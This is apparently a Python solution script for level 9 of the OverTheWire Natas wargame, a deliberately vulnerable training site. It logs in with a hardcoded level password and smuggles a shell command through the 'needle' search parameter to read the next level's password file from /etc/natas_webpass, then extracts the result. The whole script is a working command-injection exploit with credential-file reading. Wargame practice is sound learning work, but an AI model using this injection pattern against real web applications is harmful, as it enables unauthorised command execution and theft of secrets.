import re, requests
from bs4 import BeautifulSoup

username = "natas9"
password = "Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd"
url = 'http://' + username + '.natas.labs.overthewire.org'
auth = (username, password)

command = "cat /etc/natas_webpass/natas10"

params = {"needle" : "; " + command + "; ", "submit" : "submit"}
r = requests.get(url, auth=auth, params=params)
# print(r.text)
# print(BeautifulSoup(r.text, "html.parser").text)
print(re.findall(r'<pre>\n(.*)\n</pre>', r.text))
